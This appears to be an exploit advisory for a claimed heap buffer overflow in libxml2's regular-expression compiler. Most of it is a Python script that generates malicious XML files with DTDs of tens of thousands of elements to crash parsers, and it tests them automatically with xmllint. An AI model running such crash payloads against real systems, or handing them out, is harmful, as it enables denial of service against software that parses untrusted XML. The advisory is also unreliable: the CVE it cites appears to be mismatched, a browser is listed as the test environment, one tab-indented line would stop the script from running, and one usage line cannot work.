@@ -1,0 +1,195 @@
+=============================================================================================================================================
+| # Title     : libxml2 2.9.14 (2022) heap buffer overflow                                                                                  |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://gitlab.gnome.org/GNOME/libxml2                                                                                      |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/207181/ &  CVE-2024-25062
+
+[+] Summary : 
+             
+             A heap buffer overflow vulnerability was identified in libxml2, specifically within the function xmlRegEpxFromParse in xmlregexp.c. 
+			 The flaw results from a 32‑bit integer overflow during index calculation in the regular‑expression compilation phase used for DTD validation. 
+			 This overflow causes out‑of‑bounds read and write operations on the transitions table, potentially leading to memory corruption or application crashes when processing specially crafted XML content models.
+             The issue is confirmed in libxml2 version 2.9.14 (2022) and remains present in the latest development version 
+			 (HEAD: 4d69f91b25bae1e276bb38a0d91a54bade9e5e72) prior to the security fix. The vulnerability affects all platforms where libxml2 is deployed, including Linux, macOS, Windows, BSD, and embedded systems.
+			 
+[+] POC :
+
+Python PoC for Generating Malicious XML :
+
+#!/usr/bin/env python3
+"""
+CVE-2024-25062: libxml2 Heap Buffer Overflow PoC
+Integer overflow in xmlRegEpxFromParse function
+By indoushka
+"""
+
+import sys
+import os
+import subprocess
+
+def generate_malicious_xml():
+    """
+    Generate XML file with specially crafted DTD to trigger the vulnerability
+    """
+    # Magic number to trigger integer overflow
+    NUM_ELEMENTS = 46341
+    
+    print(f"[+] Generating malicious XML with {NUM_ELEMENTS} elements...")
+    
+    # Create element names
+    element_names = [f"a{i}" for i in range(NUM_ELEMENTS)]
+    
+    # Content model - very long sequence
+    content_model = ",".join(element_names)
+    
+    # Element declarations
+    element_decls = "\n".join(f"    <!ELEMENT {name} EMPTY>" for name in element_names)
+    
+    # Complete XML content
+    xml_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+    <!ELEMENT root ({content_model})>
+{element_decls}
+]>
+<root>
+{' '.join(f'<{name}/>' for name in element_names[:100])}
+</root>
+'''
+    
+    return xml_content
+
+def generate_optimized_poc():
+    """
+    Optimized PoC version using fewer elements while maintaining the effect
+    """
+    # Try different sizes to find minimum required
+    test_sizes = [46341, 40000, 32768, 30000]
+    
+    for size in test_sizes:
+        print(f"[+] Testing with {size} elements...")
+        
+        element_names = [f"el{i}" for i in range(size)]
+        content_model = ",".join(element_names)
+        
+        xml_content = f'''<?xml version="1.0"?>
+<!DOCTYPE doc [
+    <!ELEMENT doc ({content_model})>
+    {"".join(f'<!ELEMENT el{i} EMPTY>' for i in range(size))}
+]>
+<doc/>
+'''
+        
+        filename = f"poc_{size}.xml"
+        with open(filename, "w") as f:
+            f.write(xml_content)
+        print(f"[+] Created: {filename}")
+
+def create_simple_poc():
+    """
+    Create simplified PoC for quick testing
+    """
+    NUM_ELEMENTS = 46341
+    
+    element_names = [f"x{i}" for i in range(NUM_ELEMENTS)]
+    content_model = ",".join(element_names[:NUM_ELEMENTS])
+    
+    xml_content = f'''<!DOCTYPE root [
+<!ELEMENT root ({content_model})>
+{"".join(f'<!ELEMENT x{i} EMPTY>' for i in range(NUM_ELEMENTS))}
+]>
+<root/>
+'''
+    
+    with open("simple_poc.xml", "w") as f:
+        f.write(xml_content)
+    print("[+] Created: simple_poc.xml")
+
+def test_with_xmllint():
+    """
+    Automatically test the generated PoC with xmllint
+    """
+    print("[+] Testing with xmllint...")
+    
+    # Generate the malicious XML
+    xml_content = generate_malicious_xml()
+    with open("test_crash.xml", "w") as f:
+        f.write(xml_content)
+    
+    # Try to find xmllint
+    xmllint_paths = [
+        "./libxml2/.libs/xmllint",
+        "/usr/bin/xmllint",
+        "xmllint"
+    ]
+    
+    xmllint = None
+    for path in xmllint_paths:
+        if os.path.exists(path) or subprocess.run(["which", path.split('/')[-1]], capture_output=True).returncode == 0:
+            xmllint = path
+            break
+    
+    if not xmllint:
+        print("[-] xmllint not found")
+        return
+    
+    print(f"[+] Using xmllint at: {xmllint}")
+    
+    # Run the test
+    try:
+        result = subprocess.run(
+            [xmllint, "--valid", "test_crash.xml"],
+            capture_output=True,
+            text=True,
+            timeout=10
+        )
+        
+        if result.returncode != 0:
+            print("[+] SUCCESS: xmllint crashed or returned error (vulnerable)")
+            print(f"    Return code: {result.returncode}")
+            if result.stderr:
+                print(f"    Error: {result.stderr[:200]}...")
+        else:
+            print("[-] UNEXPECTED: xmllint processed file without crash")
+            
+    except subprocess.TimeoutExpired:
+        print("[+] SUCCESS: xmllint timed out (possibly vulnerable)")
+    except Exception as e:
+        print(f"[+] Exception during testing: {e}")
+
+if __name__ == "__main__":
+    print("=" * 60)
+    print("libxml2 Heap Buffer Overflow PoC - CVE-2024-25062")
+    print("Integer overflow in xmlRegEpxFromParse")
+	print("By indoushka")
+    print("=" * 60)
+    
+    if len(sys.argv) > 1:
+        if sys.argv[1] == "simple":
+            create_simple_poc()
+        elif sys.argv[1] == "optimized":
+            generate_optimized_poc()
+        elif sys.argv[1] == "test":
+            test_with_xmllint()
+        else:
+            # Create single file
+            xml_content = generate_malicious_xml()
+            with open("malicious.xml", "w") as f:
+                f.write(xml_content)
+            print("[+] Created: malicious.xml")
+    else:
+        # Default: create all test files
+        generate_optimized_poc()
+        
+    print("\n[+] Usage instructions:")
+    print("    python3 poc.py optimized    # Generate test files")
+    print("    python3 poc.py test         # Auto-test with xmllint")
+    print("    xmllint --valid poc_46341.xml")
+    print("    OR")
+    print("    python3 poc.py | xmllint --valid -")
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
